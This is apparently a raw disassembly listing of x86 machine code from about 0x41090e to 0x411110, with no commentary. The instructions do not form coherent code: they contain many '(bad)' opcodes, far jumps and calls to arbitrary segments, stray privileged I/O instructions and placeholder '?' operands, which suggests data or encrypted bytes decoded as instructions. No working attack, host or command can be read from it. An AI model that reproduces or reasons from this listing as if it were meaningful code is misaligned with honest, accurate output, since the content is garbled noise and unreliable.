  41090e:	and    al,0xc9
  410910:	je     0x4108a0
  410912:	jnp    0x4108b9
  410914:	dec    edx
  410915:	sub    bl,0x34
  410918:	adc    eax,0x2356202c
  41091d:	push   0x66e0f24b
  410922:	mov    ebp,0x9b0462e0
  410927:	mov    WORD PTR [ebp-0x14],?
  41092a:	ja     0x410930
  41092c:	xor    DWORD PTR [ecx+0x7c],ebp
  41092f:	mov    ds:0x169f4b71,eax
  410934:	mov    bl,0xe1
  410936:	jmp    0xb191b7c1
  41093b:	mov    bh,0xa
  41093d:	mov    cl,0x9
  41093f:	xchg   edx,eax
  410940:	test   eax,0x7852b16
  410945:	cmc    
  410946:	mov    bl,0xe3
  410948:	pop    es
  410949:	or     BYTE PTR [edx+edi*4+0x4f],bl
  41094d:	mov    ebx,0x241cf315
  410952:	lock jnp 0x410970
  410955:	pop    ebx
  410956:	mov    edx,0x22fe74bd
  41095b:	popf   
  41095c:	mov    ecx,0x45851322
  410961:	addr16 mov bh,0x6c
  410964:	loopne 0x410940
  410966:	ret    
  410967:	aad    0xbb
  410969:	mov    ebx,0xa7783ceb
  41096e:	xchg   esi,eax
  41096f:	xchg   esp,eax
  410970:	repz dec ecx
  410972:	and    edx,ebx
  410974:	mov    WORD PTR [edi-0x2f],?
  410977:	outs   dx,BYTE PTR ds:[esi]
  410978:	pop    esi
  410979:	ficomp WORD PTR [ecx+0x7a01ef7]
  41097f:	out    0x1,al
  410981:	sysenter 
  410983:	mov    eax,ds:0x88716fac
  410988:	inc    BYTE PTR [ebx+0x5c3061f7]
  41098e:	add    BYTE PTR [edx+0x47],0x9c
  410992:	mov    esi,0x842e7b5b
  410997:	dec    ebx
  410998:	sub    DWORD PTR [edi],esp
  41099a:	push   ds
  41099b:	in     al,0x40
  41099d:	adc    eax,0x9944c496
  4109a2:	leave  
  4109a3:	mov    ds:0x19d306d,eax
  4109a8:	(bad)  
  4109a9:	pop    ebx
  4109aa:	retf   0x74b1
  4109ad:	arpl   WORD PTR [esi],dx
  4109af:	loopne 0x4109b7
  4109b1:	jl     0x41093e
  4109b3:	mov    ebx,0x839b682e
  4109b8:	jmp    0x41099a
  4109ba:	cmp    cl,BYTE PTR fs:[esi+ecx*4-0xa]
  4109bf:	outs   dx,BYTE PTR ds:[esi]
  4109c0:	sub    DWORD PTR [esi+0x51069f08],edi
  4109c6:	inc    ebp
  4109c7:	repz mov esi,0xd6b65bf0
  4109cd:	lds    esp,FWORD PTR [edi-0xf]
  4109d0:	or     eax,0x3a97323e
  4109d5:	lea    eax,[edx-0xdc6f8c3]
  4109db:	inc    ebp
  4109dc:	adc    DWORD PTR [edi],esi
  4109de:	xchg   esi,eax
  4109df:	cmp    al,0x97
  4109e1:	loopne 0x4109e1
  4109e3:	ret    0x16b6
  4109e6:	jmp    0xbac3:0x90f7fe7a
  4109ed:	sbb    DWORD PTR [esi],edx
  4109ef:	stos   DWORD PTR es:[edi],eax
  4109f0:	ror    DWORD PTR [eax+0x6b2070fd],1
  4109f6:	call   0x936f07eb
  4109fb:	push   es
  4109fc:	aaa    
  4109fd:	mov    ch,0x4e
  4109ff:	jae    0x410a6f
  410a01:	in     al,dx
  410a02:	xor    eax,0x7162bbf3
  410a07:	bswap  edx
  410a09:	mov    esp,esi
  410a0b:	dec    ecx
  410a0c:	ins    DWORD PTR es:[edi],dx
  410a0d:	pop    esp
  410a0e:	xchg   ebp,eax
  410a0f:	cmp    DWORD PTR [eax+0xb],eax
  410a12:	test   al,0xbf
  410a14:	mov    esi,0x6ec85cd5
  410a19:	xchg   BYTE PTR [ecx],dh
  410a1b:	rcl    DWORD PTR [edi-0xe],0xac
  410a1f:	cmc    
  410a20:	fwait
  410a21:	mov    ds:0x63c40d27,eax
  410a26:	xor    al,0x55
  410a28:	jae    0x4109aa
  410a2a:	mov    ds:0x870ff947,eax
  410a2f:	cmp    cl,BYTE PTR es:[edx]
  410a32:	ja     0x410a47
  410a34:	ins    BYTE PTR es:[edi],dx
  410a35:	push   0x7dee49fb
  410a3a:	stos   DWORD PTR es:[edi],eax
  410a3b:	cs cld 
  410a3d:	retf   0xf0d2
  410a40:	or     bh,ah
  410a42:	aaa    
  410a43:	cmp    al,0x84
  410a45:	mov    eax,edx
  410a47:	aas    
  410a48:	test   ecx,ebp
  410a4a:	jne    0x4109f2
  410a4c:	test   DWORD PTR [ebp+0x11564462],edi
  410a52:	aas    
  410a53:	xor    dh,BYTE PTR [edx+ebx*1-0x3b5828a2]
  410a5a:	mov    ecx,0xb966ac1e
  410a5f:	push   eax
  410a60:	xor    BYTE PTR [edx-0x2abbc6c6],bl
  410a66:	jle    0x410a28
  410a68:	out    dx,eax
  410a69:	clc    
  410a6a:	stos   DWORD PTR es:[edi],eax
  410a6b:	xchg   ebp,eax
  410a6c:	in     al,dx
  410a6d:	jb     0x410a53
  410a6f:	or     dh,ch
  410a71:	call   0x8f77:0xe8915117
  410a78:	sub    esp,DWORD PTR [eax-0x5fc87ea2]
  410a7e:	mov    esp,0x6650c8c3
  410a83:	mov    dl,0xa
  410a85:	hlt    
  410a86:	push   eax
  410a87:	pop    ds
  410a88:	lods   eax,DWORD PTR ds:[esi]
  410a89:	or     eax,0xa6e24ff3
  410a8e:	jp     0x410a48
  410a90:	inc    eax
  410a91:	mov    ebx,0x74c82c69
  410a96:	jno    0x410ae7
  410a98:	lods   eax,DWORD PTR ds:[esi]
  410a99:	push   0xffffffa6
  410a9b:	nop
  410a9c:	cmp    DWORD PTR [ebp-0x7e230806],ebp
  410aa2:	jle    0x410a63
  410aa4:	inc    ebx
  410aa5:	out    dx,al
  410aa6:	mov    ebx,0x38230f9
  410aab:	retf   0x7520
  410aae:	icebp  
  410aaf:	mov    ah,BYTE PTR [edx]
  410ab1:	inc    edi
  410ab2:	retf   0x7dd9
  410ab5:	call   0xa0fe:0xe3d285a
  410abc:	mov    ebp,ecx
  410abe:	and    ebp,DWORD PTR [edx-0xe]
  410ac1:	and    BYTE PTR [eax+0x5],dl
  410ac4:	ds jl  0x410a53
  410ac7:	jo     0x410a90
  410ac9:	mov    WORD PTR [edx+0x4],gs
  410acc:	retf   0xd7f1
  410acf:	scas   eax,DWORD PTR es:[edi]
  410ad0:	hlt    
  410ad1:	sbb    DWORD PTR [esp+eax*1+0x4ceaeed7],0x9625ac0a
  410adc:	mov    esi,DWORD PTR [ebx-0x5f72ad3f]
  410ae2:	(bad)  
  410ae4:	xchg   ebp,eax
  410ae5:	jmp    0x73b72745
  410aea:	xchg   ebx,eax
  410aeb:	xor    ebp,DWORD PTR [ecx-0x65ff2641]
  410af1:	sub    eax,0xf9651204
  410af6:	or     al,BYTE PTR [ecx-0x4a]
  410af9:	push   eax
  410afa:	mov    edi,0x8b9acfb2
  410aff:	mov    fs,WORD PTR [esi-0x3c2269c7]
  410b05:	mov    esi,esp
  410b07:	jge    0x410aa8
  410b09:	(bad)  
  410b0a:	lea    edi,[esi-0x48]
  410b0d:	int3   
  410b0e:	inc    ebx
  410b0f:	test   DWORD PTR [ebx+0x3f],0xbef2d358
  410b16:	jle    0x410b09
  410b18:	into   
  410b19:	jmp    0x71a41f7b
  410b1e:	std    
  410b1f:	cmp    eax,0x64673d39
  410b24:	adc    al,0x44
  410b26:	adc    dh,BYTE PTR [edi+ebp*8+0x4c7f557f]
  410b2d:	pop    esp
  410b2e:	ret    
  410b2f:	imul   esp,DWORD PTR [edx],0x12dcabf9
  410b35:	dec    ebx
  410b36:	icebp  
  410b37:	jb     0x410aeb
  410b39:	pop    edx
  410b3a:	jecxz  0x410b22
  410b3c:	mov    esp,DWORD PTR ss:[esi]
  410b3f:	dec    edx
  410b40:	cwde   
  410b41:	inc    ecx
  410b42:	int    0xe4
  410b44:	or     eax,0xabcd644c
  410b49:	jno    0x410b76
  410b4b:	cmp    bl,BYTE PTR [edx]
  410b4d:	inc    ecx
  410b4e:	pop    ecx
  410b4f:	inc    edx
  410b50:	adc    al,0xef
  410b52:	jmp    0x7d7c:0x731ccfe7
  410b59:	jle    0x410baa
  410b5b:	nop
  410b5c:	test   BYTE PTR [esi+0x310e8497],ah
  410b62:	stos   BYTE PTR es:[edi],al
  410b63:	sub    BYTE PTR [esp+edi*8],ah
  410b66:	call   0xdb3cf2f2
  410b6b:	mov    ?,ecx
  410b6d:	adc    cl,BYTE PTR [ebx]
  410b6f:	xor    cl,BYTE PTR [edi+0xcf8dd65]
  410b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b76:	sub    ebp,esi
  410b78:	(bad)  
  410b79:	js     0x410b22
  410b7b:	out    dx,eax
  410b7c:	mov    edx,0xbbf92809
  410b81:	mov    cl,0x73
  410b83:	mov    ds:0x42cac401,eax
  410b88:	dec    esi
  410b89:	jnp    0x410bd6
  410b8b:	mov    eax,ds:0x61d1709a
  410b90:	jne    0x410b7b
  410b92:	inc    eax
  410b93:	push   0xbe8faea5
  410b98:	adc    al,0x6e
  410b9a:	jb     0x410bd4
  410b9c:	adc    eax,0x9967987c
  410ba1:	sbb    ch,ah
  410ba3:	and    BYTE PTR [edi+0x34],bl
  410ba6:	add    DWORD PTR [esi],eax
  410ba8:	jge    0x410b4e
  410baa:	cli    
  410bab:	outs   dx,BYTE PTR ds:[esi]
  410bac:	popf   
  410bad:	jle    0x410b34
  410baf:	mov    ss,WORD PTR [eax-0x6d35c367]
  410bb5:	and    edi,esi
  410bb7:	fcmovnb st,st(4)
  410bb9:	imul   ecx,DWORD PTR [edi],0xb83849ab
  410bbf:	pop    edx
  410bc0:	sub    al,0x8f
  410bc2:	adc    al,0x83
  410bc4:	lahf   
  410bc5:	jmp    0x8243:0x33423d1f
  410bcc:	jmp    0x410c11
  410bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd0:	cdq    
  410bd1:	jmp    0x4998:0x7af33651
  410bd8:	(bad)  
  410bda:	xor    esi,DWORD PTR [edx+0x77]
  410bdd:	stos   BYTE PTR es:[edi],al
  410bde:	jnp    0x410bc0
  410be0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410be2:	ror    BYTE PTR [edi+0x13],cl
  410be5:	lds    ebx,FWORD PTR ss:[ebx+ebp*4]
  410be9:	rol    BYTE PTR [ebp+ebx*2-0x651ed69f],1
  410bf0:	repz or WORD PTR [edx],bp
  410bf4:	lds    ebx,FWORD PTR [ebp-0xa7be701]
  410bfa:	cmp    ah,BYTE PTR [esp+esi*2]
  410bfd:	mov    cl,BYTE PTR [ecx-0x7a]
  410c00:	xor    al,0xd6
  410c02:	frstor [ecx]
  410c04:	or     al,0x32
  410c06:	cmp    esi,DWORD PTR [edi-0x7d]
  410c09:	jmp    0x410c48
  410c0b:	repnz mov BYTE PTR [eax+0x275c3e55],ch
  410c12:	push   eax
  410c13:	jb     0x410c5d
  410c15:	push   esp
  410c16:	xor    bl,ch
  410c18:	mov    ah,0x33
  410c1a:	mov    eax,ds:0x43f2c433
  410c1f:	sbb    esp,DWORD PTR [edx-0x58]
  410c22:	and    eax,0xdca07847
  410c27:	les    eax,FWORD PTR [eax+0x46]
  410c2a:	mov    edi,0x5369d731
  410c2f:	push   edx
  410c30:	(bad)  
  410c31:	sbb    al,BYTE PTR [esi]
  410c33:	mov    dl,0x8
  410c35:	daa    
  410c36:	fnsave [ecx-0x7dbc0498]
  410c3c:	dec    esp
  410c3d:	or     BYTE PTR [ebp-0x77386bcb],0x76
  410c44:	mov    WORD PTR [ebx-0x17],gs
  410c47:	pop    edi
  410c48:	(bad)  
  410c49:	xchg   esp,eax
  410c4a:	push   cs
  410c4b:	cmp    ah,BYTE PTR ds:0xeda6ea9a
  410c51:	mov    ecx,0xe0ce63e4
  410c56:	pop    ds
  410c57:	jbe    0x410cba
  410c59:	add    DWORD PTR [ebp-0x76993f74],ebp
  410c5f:	mov    ds:0xca29b7ba,eax
  410c64:	jmp    0x52f68a2b
  410c69:	push   ebp
  410c6a:	or     eax,0xa75436f0
  410c6f:	xor    esp,DWORD PTR [esi-0x7e3ab48d]
  410c75:	popf   
  410c76:	add    DWORD PTR [ebx],0x8f57c6a1
  410c7c:	pop    esi
  410c7d:	call   0xc101:0xd4f768c6
  410c84:	fs cs or eax,0x435e36b5
  410c8b:	stos   DWORD PTR es:[edi],eax
  410c8c:	jno    0x410c1f
  410c8e:	add    eax,0xaa3d5e7f
  410c93:	bound  ecx,QWORD PTR [ebp+0xe]
  410c96:	ficom  WORD PTR [eax+0x532bfdee]
  410c9c:	lock mov ds:0x8393940e,eax
  410ca2:	scas   eax,DWORD PTR es:[edi]
  410ca3:	int    0xf1
  410ca5:	xchg   ebp,eax
  410ca6:	lock loop 0x410ccc
  410ca9:	scas   eax,DWORD PTR es:[edi]
  410caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cab:	mov    ch,0x5c
  410cad:	cdq    
  410cae:	bound  esp,QWORD PTR [esi+0x39]
  410cb1:	repnz or cl,al
  410cb4:	mov    ds:0x14c3ecb6,al
  410cb9:	dec    esp
  410cba:	push   ecx
  410cbb:	pop    eax
  410cbd:	sub    al,0xdd
  410cbf:	(bad)  [edi+0x518fb049]
  410cc5:	lods   eax,DWORD PTR ds:[esi]
  410cc6:	xchg   ecx,eax
  410cc7:	pop    ebx
  410cc8:	xor    BYTE PTR [ecx-0x38],ah
  410ccb:	pushf  
  410ccc:	xor    eax,0xab076b87
  410cd1:	daa    
  410cd2:	inc    ecx
  410cd3:	push   ebp
  410cd4:	loope  0x410d0e
  410cd6:	inc    esp
  410cd7:	sbb    al,0xff
  410cd9:	pop    ss
  410cda:	in     al,0x9c
  410cdc:	clc    
  410cdd:	mov    gs,ecx
  410cdf:	inc    ebx
  410ce0:	cmp    cl,BYTE PTR [ebp+0x7f]
  410ce3:	jecxz  0x410cc5
  410ce5:	adc    al,0x4a
  410ce7:	xor    BYTE PTR [ebx+0x4b5d9fdb],bl
  410ced:	shl    BYTE PTR [edx+0x1c],1
  410cf0:	add    eax,0xdec5b262
  410cf5:	aad    0x20
  410cf7:	pop    ebx
  410cf8:	sub    eax,0xdc6108ff
  410cfd:	rol    DWORD PTR [esi+esi*8],cl
  410d00:	fsubr  DWORD PTR [edx-0x1e]
  410d03:	push   esi
  410d04:	shl    BYTE PTR [esi],0x62
  410d07:	lods   al,BYTE PTR ds:[esi]
  410d08:	cmp    eax,0x875f02e3
  410d0d:	sub    al,0xd4
  410d0f:	add    BYTE PTR [eax-0x7727316c],dh
  410d15:	shl    BYTE PTR [ebp+ecx*4+0x2bb71122],0x26
  410d1d:	retf   0x25e9
  410d20:	jp     0x410d26
  410d22:	lea    ebp,[edi]
  410d24:	jmp    0x410d2c
  410d26:	jno    0x410d2b
  410d28:	push   ds
  410d29:	fcmovnbe st,st(2)
  410d2b:	stos   DWORD PTR es:[edi],eax
  410d2c:	scas   eax,DWORD PTR es:[edi]
  410d2d:	arpl   cx,di
  410d2f:	cmp    BYTE PTR [edi-0x14cf3863],dl
  410d35:	sar    BYTE PTR [eax],0xa6
  410d38:	lea    ebp,[eax+ecx*2-0x52]
  410d3c:	cwde   
  410d3d:	retf   
  410d3e:	jne    0x410d3c
  410d40:	imul   ecx,ebp,0xffffff9a
  410d43:	jo     0x410d84
  410d45:	mov    bh,0xf0
  410d47:	das    
  410d48:	jo     0x410cde
  410d4a:	fidiv  DWORD PTR [eax]
  410d4c:	jae    0x410d4b
  410d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d4f:	pop    es
  410d50:	cwde   
  410d51:	sbb    eax,0x8e910306
  410d56:	loope  0x410d1d
  410d58:	dec    ebp
  410d59:	pop    eax
  410d5a:	add    ch,BYTE PTR ds:0xca3ea2db
  410d60:	jge    0x410d41
  410d62:	addr16 pop esp
  410d64:	mov    dh,0x41
  410d66:	(bad)  
  410d67:	pop    edi
  410d68:	in     eax,0x86
  410d6a:	pop    ebp
  410d6b:	sub    eax,0x78aa1fa3
  410d70:	adc    ecx,ecx
  410d72:	stos   DWORD PTR es:[edi],eax
  410d73:	adc    edx,DWORD PTR [edx-0x47]
  410d76:	dec    edi
  410d77:	mov    al,ds:0xa2d73465
  410d7c:	inc    ebp
  410d7d:	or     edx,DWORD PTR [eax+0x1bf752a6]
  410d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d84:	push   0x29
  410d86:	(bad)  
  410d87:	ds and ebx,0x75
  410d8b:	sub    al,0xd5
  410d8d:	jbe    0x410d4f
  410d8f:	(bad)  
  410d90:	mov    ?,WORD PTR [edx]
  410d92:	xchg   ebp,eax
  410d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d94:	mov    edi,DWORD PTR [edi]
  410d96:	mov    eax,ds:0x5406230
  410d9b:	xlat   BYTE PTR ds:[ebx]
  410d9c:	cmp    BYTE PTR [esp+edi*2],ch
  410d9f:	mov    esi,0x8ef48610
  410da4:	or     BYTE PTR [eax-0x16],al
  410da7:	js     0x410dec
  410da9:	fsub   QWORD PTR [edi-0x344841b6]
  410daf:	dec    esi
  410db0:	scas   al,BYTE PTR es:[edi]
  410db1:	outs   dx,DWORD PTR ds:[esi]
  410db2:	sub    ecx,DWORD PTR [edx-0x3405c78d]
  410db8:	dec    eax
  410db9:	mov    BYTE PTR [edi-0x48dd02ee],dh
  410dbf:	out    0xd0,eax
  410dc1:	mov    eax,0xa8cf6cc7
  410dc6:	mov    edi,0xd5309ef9
  410dcb:	xor    DWORD PTR [esi],esi
  410dcd:	mov    ecx,0xee3094c3
  410dd2:	and    DWORD PTR [ebx+0x38e6a5b3],esp
  410dd8:	xor    BYTE PTR ds:0x6a455980,ah
  410dde:	adc    al,0x91
  410de0:	arpl   WORD PTR [esi-0x7d],ax
  410de3:	cmc    
  410de4:	(bad)  [ebp-0x2f197e87]
  410dea:	aam    0xa1
  410dec:	jg     0x410d90
  410dee:	(bad)  
  410def:	(bad)  
  410df0:	jmp    0x192e:0xd0291190
  410df7:	add    bl,al
  410df9:	xor    ch,BYTE PTR [eax]
  410dfb:	dec    edx
  410dfc:	call   0x4a80:0xed05c184
  410e03:	cld    
  410e04:	and    ah,BYTE PTR [edi+eax*2]
  410e07:	aam    0x3a
  410e09:	push   ebp
  410e0a:	pop    ecx
  410e0b:	inc    esi
  410e0c:	sbb    al,0x75
  410e0e:	cli    
  410e0f:	ds push 0x3b
  410e12:	and    bh,BYTE PTR [ebx]
  410e14:	or     al,0x33
  410e16:	xor    ah,BYTE PTR [ebp+ebx*2-0x408e3d9b]
  410e1d:	cmp    esi,ebx
  410e1f:	jecxz  0x410dc1
  410e21:	lods   eax,DWORD PTR ds:[esi]
  410e22:	mov    esi,0x8a7da6e9
  410e27:	jp     0x410e68
  410e29:	jno    0x410dc7
  410e2b:	ins    DWORD PTR es:[edi],dx
  410e2c:	dec    esi
  410e2d:	js     0x410ea1
  410e2f:	std    
  410e30:	sub    DWORD PTR [edx+0x4c2ed39b],ecx
  410e36:	arpl   cx,cx
  410e38:	jb     0x410e14
  410e3a:	shr    BYTE PTR [eax+0x19],0x13
  410e3e:	sbb    dh,BYTE PTR [edx-0x63]
  410e41:	push   ebx
  410e42:	jno    0x410df1
  410e44:	dec    esp
  410e45:	or     ebx,edi
  410e47:	iret   
  410e48:	mov    ?,WORD PTR ds:0xd7a916ad
  410e4e:	sub    al,0x23
  410e50:	shl    ebx,0x84
  410e53:	cwde   
  410e54:	mov    dh,0x59
  410e56:	in     al,dx
  410e57:	test   DWORD PTR [eax-0x72],edx
  410e5a:	sub    DWORD PTR [ebp-0x2fdf5b52],esp
  410e60:	jmp    0x92e161af
  410e65:	push   ebp
  410e66:	sbb    ecx,DWORD PTR [esi-0xc]
  410e69:	push   ebp
  410e6a:	fcmovnb st,st(5)
  410e6c:	or     eax,0x9c63e41d
  410e71:	push   0xffffff86
  410e73:	adc    DWORD PTR [ecx-0x76acfd1f],edi
  410e79:	adc    DWORD PTR [esi-0x46],ecx
  410e7c:	ror    DWORD PTR [ecx+0x6b],cl
  410e7f:	popf   
  410e80:	shr    DWORD PTR [ebx-0x14],1
  410e83:	push   ebx
  410e84:	iret   
  410e85:	mov    esp,ss
  410e87:	aas    
  410e88:	and    DWORD PTR ds:0x89482b92,esi
  410e8e:	mov    dh,0xc0
  410e90:	adc    eax,0xa6fb7c6d
  410e95:	push   ecx
  410e96:	add    bh,BYTE PTR [esi+0x3238732d]
  410e9c:	ins    BYTE PTR es:[edi],dx
  410e9d:	sahf   
  410e9e:	jb     0x410e6c
  410ea0:	mov    edi,0x4d4aa2ce
  410ea5:	inc    edi
  410ea6:	adc    al,0xd0
  410ea8:	fwait
  410ea9:	sbb    ebp,eax
  410eab:	int3   
  410eac:	dec    esp
  410ead:	cmp    eax,0x5b4760f9
  410eb2:	mov    ebp,0x80ff6151
  410eb7:	mov    ds:0x34f26e57,al
  410ebc:	push   es
  410ebd:	(bad)
  410ec1:	out    0x3f,al
  410ec3:	inc    eax
  410ec4:	pop    es
  410ec5:	popf   
  410ec6:	or     bh,BYTE PTR [ecx+eax*2-0x6f2680b9]
  410ecd:	dec    edi
  410ece:	lock push esp
  410ed0:	(bad)  
  410ed1:	daa    
  410ed2:	int3   
  410ed3:	sub    ch,BYTE PTR [eax-0x48]
  410ed6:	mov    ch,0xe
  410ed8:	xchg   edx,eax
  410ed9:	xchg   edi,eax
  410eda:	cmp    dh,0xb0
  410edd:	out    dx,al
  410ede:	mov    bl,0x5b
  410ee0:	xor    bl,BYTE PTR [eax]
  410ee2:	imul   edx,ecx,0x13b227e7
  410ee8:	dec    ebp
  410ee9:	mov    bh,cl
  410eeb:	pop    esi
  410eec:	adc    BYTE PTR [eax-0x54],0xfa
  410ef0:	ror    ch,cl
  410ef2:	jae    0x410f43
  410ef4:	pop    ebp
  410ef5:	repnz xchg ecx,eax
  410ef7:	gs or  ebp,ecx
  410efa:	sbb    al,0xdf
  410efc:	jmp    0xefaba4d4
  410f01:	mov    al,0xcc
  410f03:	push   esp
  410f04:	lock and DWORD PTR [eax+0x44cea8cb],edi
  410f0b:	jne    0x410ec2
  410f0d:	imul   eax,DWORD PTR [ecx+0x1e7494e2],0xffffffcf
  410f14:	xchg   ebx,eax
  410f15:	adc    DWORD PTR [ebp+0x4b],esi
  410f18:	and    al,0x96
  410f1a:	shl    DWORD PTR [ecx-0x2ed787af],1
  410f20:	pusha  
  410f21:	xchg   ebp,eax
  410f22:	mov    ecx,0x40d1cff4
  410f27:	aaa    
  410f28:	or     eax,0x6e1cf282
  410f2d:	adc    BYTE PTR [ecx],bh
  410f2f:	leave  
  410f30:	jne    0x410ec1
  410f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f33:	adc    al,0x93
  410f35:	call   0x3e65534
  410f3a:	cmp    DWORD PTR [eax-0x7459f714],0x5257d56b
  410f44:	dec    edi
  410f45:	fwait
  410f46:	mov    al,0xd8
  410f48:	(bad)  
  410f49:	xchg   ecx,eax
  410f4a:	ret    0x4174
  410f4d:	xor    ch,BYTE PTR [ecx-0x4f5bf822]
  410f53:	adc    DWORD PTR [ebp-0x9],ecx
  410f56:	cwde   
  410f57:	cwde   
  410f58:	lea    edx,[eax]
  410f5a:	ds pop edx
  410f5c:	out    0x8e,eax
  410f5e:	adc    eax,0x4936851
  410f63:	sahf   
  410f64:	inc    ebx
  410f65:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410f67:	mov    dh,0x25
  410f69:	fnstenv [edx-0x25e16c22]
  410f6f:	cmp    eax,0xca400a3d
  410f74:	es adc al,dh
  410f77:	cmp    DWORD PTR [edi],edx
  410f79:	aam    0x56
  410f7b:	bound  edx,QWORD PTR [esp+ebx*8+0x2401ffa]
  410f82:	mov    ah,0xd0
  410f84:	push   0x14
  410f86:	push   cs
  410f87:	pop    esi
  410f88:	leave  
  410f89:	xor    BYTE PTR [edi],cl
  410f8b:	stc    
  410f8c:	cmp    DWORD PTR [ebx+0x26],esi
  410f8f:	add    ebx,edi
  410f91:	sub    DWORD PTR [ebx],0x53
  410f94:	bnd ds jp 0x410f66
  410f98:	(bad)  
  410f99:	pop    edx
  410f9a:	mov    esp,0xa3d97291
  410f9f:	mov    edx,0x2136fad2
  410fa4:	es scas al,BYTE PTR es:[edi]
  410fa6:	xlat   BYTE PTR ds:[ebx]
  410fa7:	sbb    esi,DWORD PTR [eax+0x19fc1f0e]
  410fad:	inc    esp
  410fae:	mov    al,0x30
  410fb0:	jb     0x411017
  410fb2:	mov    edi,0xd31e9c97
  410fb7:	daa    
  410fb8:	cmp    ebx,0xfffffff5
  410fbb:	inc    ebp
  410fbc:	fsub   st(1),st
  410fbe:	xchg   DWORD PTR [edx-0x3b],edi
  410fc1:	push   eax
  410fc2:	in     eax,dx
  410fc3:	adc    bh,BYTE PTR [edx]
  410fc5:	and    eax,0x9733c32e
  410fcb:	ficom  WORD PTR [ecx]
  410fcd:	adc    DWORD PTR [ebx],edi
  410fcf:	jmp    edx
  410fd1:	or     bl,bh
  410fd3:	adc    BYTE PTR [ecx+edx*2+0x66ca8b2b],bh
  410fda:	inc    ebx
  410fdb:	and    ah,BYTE PTR [ecx-0x28]
  410fde:	sti    
  410fdf:	inc    edx
  410fe0:	ror    ch,cl
  410fe2:	sbb    dl,BYTE PTR [esi+0x3b]
  410fe5:	loopne 0x411010
  410fe7:	leave  
  410fe8:	mov    ebp,?
  410fea:	jbe    0x411024
  410fec:	push   esi
  410fed:	sbb    cl,bl
  410fef:	add    BYTE PTR [ecx+eax*1],dh
  410ff2:	sar    edi,1
  410ff4:	add    edx,edi
  410ff6:	(bad)  
  410ff7:	jle    0x410f7e
  410ff9:	popf   
  410ffa:	shr    DWORD PTR [ecx],1
  410ffc:	xor    BYTE PTR [edx+ecx*8+0x539fccf8],dl
  411003:	push   esi
  411004:	sub    al,0xdb
  411006:	and    bl,BYTE PTR [eax+0x639da599]
  41100c:	fcmovnb st,st(0)
  41100e:	cmp    eax,DWORD PTR [ebx]
  411010:	ins    BYTE PTR es:[edi],dx
  411011:	std    
  411012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411013:	ret    0xc112
  411016:	sahf   
  411017:	dec    edi
  411018:	jno    0x411065
  41101a:	test   al,0xa2
  41101c:	jl     0x411005
  41101e:	dec    ecx
  41101f:	inc    esi
  411020:	fwait
  411021:	jle    0x411038
  411023:	fiadd  WORD PTR [ebx]
  411025:	mov    al,0xae
  411027:	xchg   ebp,eax
  411028:	seto   BYTE PTR [edx+0x65f4ded7]
  41102f:	cld    
  411030:	dec    edi
  411031:	dec    dh
  411033:	inc    esp
  411034:	cli    
  411035:	add    DWORD PTR [esi],ebp
  411037:	mov    ds:0x8631ee94,eax
  41103c:	imul   esp,DWORD PTR [edx],0xa4544607
  411042:	or     bl,bh
  411044:	dec    edx
  411045:	sbb    dl,BYTE PTR [ebp+0x5]
  411048:	lahf   
  411049:	fcmovb st,st(4)
  41104b:	(bad)  
  41104c:	jnp    0x410ff2
  41104e:	ror    BYTE PTR [esi],1
  411050:	push   eax
  411051:	dec    edx
  411052:	les    esi,FWORD PTR [edx-0x19ce0736]
  411058:	adc    DWORD PTR [ebp+0x33adebc1],ebx
  41105e:	mov    esp,0x5b80f1e2
  411063:	xchg   edx,eax
  411064:	cld    
  411065:	push   ebx
  411066:	inc    esi
  411067:	jns    0x410ffe
  411069:	mov    cl,0x75
  41106b:	xchg   ebp,eax
  41106c:	fwait
  41106d:	out    dx,eax
  41106e:	inc    edi
  41106f:	ins    BYTE PTR es:[edi],dx
  411070:	ror    esp,cl
  411072:	mov    al,BYTE PTR [ebx-0x51]
  411075:	adc    al,0xc3
  411077:	add    eax,0x18679c24
  41107c:	lds    edx,FWORD PTR [edx]
  41107e:	and    DWORD PTR [ebx-0x49],edx
  411081:	add    ax,0x1756
  411085:	mov    edx,0x2d6862e0
  41108a:	mov    ds:0xdfc905e9,eax
  41108f:	add    bl,BYTE PTR ds:0x7653ec72
  411095:	xchg   edi,eax
  411096:	cmp    BYTE PTR [ecx],ch
  411098:	pop    esp
  411099:	lea    ecx,[edi+0x22]
  41109c:	clc    
  41109d:	jne    0x411055
  41109f:	mov    ecx,0xf1d548ea
  4110a4:	dec    esi
  4110a5:	aaa    
  4110a6:	sbb    esp,DWORD PTR [ecx-0x40a30882]
  4110ac:	cld    
  4110ad:	popa   
  4110ae:	or     esp,DWORD PTR [eax-0x59]
  4110b1:	add    BYTE PTR [edi+0x5c],0x90
  4110b5:	adc    al,0x54
  4110b7:	enter  0x8fd6,0xcc
  4110bb:	jg     0x411106
  4110bd:	adc    eax,0x232369b1
  4110c2:	(bad)  
  4110c3:	jle    0x41108d
  4110c5:	fimul  DWORD PTR [eax]
  4110c7:	or     eax,esi
  4110c9:	cmp    al,0xd2
  4110cb:	add    BYTE PTR [esi],dl
  4110cd:	xor    BYTE PTR gs:[ecx+esi*2+0x612059c0],0x45
  4110d6:	hlt    
  4110d7:	mov    eax,ds:0xa30be050
  4110dc:	mov    ?,WORD PTR cs:[ebp+0x4]
  4110e0:	imul   ecx,DWORD PTR ds:[eax+esi*4-0x15],0x5c
  4110e6:	dec    ebp
  4110e7:	mov    esi,0xb26e44a1
  4110ec:	scas   al,BYTE PTR es:[edi]
  4110ed:	push   edi
  4110ee:	bound  eax,QWORD PTR [edi-0x30]
  4110f1:	jmp    0x12688656
  4110f6:	pop    esp
  4110f7:	int3   
  4110f8:	imul   edx,DWORD PTR [edx+0x29],0x1d
  4110fc:	std    
  4110fd:	sub    al,0x0
  4110ff:	outs   dx,BYTE PTR ds:[esi]
  411100:	add    eax,0xa0b10e36
  411105:	push   0x82ccccc0
  41110a:	dec    DWORD PTR [ebp+ebp*1+0x2d]
  41110e:	je     0x41114f
  411110:	in     al,dx
